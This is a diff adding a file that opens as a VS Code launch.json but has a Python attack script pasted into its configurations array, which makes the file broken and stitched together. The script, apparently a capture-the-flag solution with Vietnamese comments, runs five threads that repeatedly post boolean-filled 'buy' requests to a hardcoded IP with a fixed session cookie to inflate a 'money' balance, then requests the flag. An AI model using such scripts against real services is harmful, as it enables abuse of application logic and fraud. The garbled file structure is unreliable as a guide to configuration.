@@ -1,0 +1,73 @@
+{
+    // Use IntelliSense to learn about possible attributes.
+    // Hover to view descriptions of existing attributes.
+    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
+    "version": "0.2.0",
+    "configurations": [
+        {
+            import requests
+import threading
+
+def buy_and_flag_thread(burp_url, headers, cookies, buy_json, flag_json):
+    while True:
+        # Thực hiện yêu cầu POST với JSON buy_json
+        response = requests.post(burp_url, headers=headers, cookies=cookies, json=buy_json)
+
+        # Kiểm tra nếu response không thành công
+        if response.status_code != 200:
+            print(f"Request failed with status code: {response.status_code}")
+            return
+
+        # Lấy giá trị money từ response
+        money = response.json().get("money", None)
+
+        # Kiểm tra nếu giá trị money là None (không tìm thấy trong response)
+        if money is None:
+            print("Could not extract 'money' value from response")
+            return
+
+        # So sánh giá trị money với 99999999999
+        if money > 99999999999:
+            print("Congratulations! Money value is greater than 99999999999.")
+            
+            # Thực hiện yêu cầu POST với JSON flag_json
+            flag_response = requests.post(burp_url, headers=headers, cookies=cookies, json=flag_json)
+            print("Flag Response:", flag_response.text)
+            break
+
+def main():
+    burp_url = "http://152.67.127.64:8002/api.php"
+    cookies = {"PHPSESSID": "ce75dda2ca38117f608b7dfc90557553"}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "Content-Type": "application/json",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "http://152.67.127.64:8002",
+        "Connection": "close",
+        "Referer": "http://152.67.127.64:8002/buy.php",
+        
+    }
+    buy_json = {"action": "buy", "numbers": [True, True, True, True, True, True, True]}
+    flag_json = {"action": "flag"}
+    # Số luồng bạn muốn chạy
+    num_threads = 5
+
+    # Tạo danh sách các luồng
+    threads = [threading.Thread(target=buy_and_flag_thread, args=(burp_url, headers, cookies, buy_json, flag_json)) for _ in range(num_threads)]
+
+    # Bắt đầu tất cả các luồng
+    for thread in threads:
+        thread.start()
+
+    # Chờ tất cả các luồng hoàn thành
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    main()
+        }
+    ]
+}
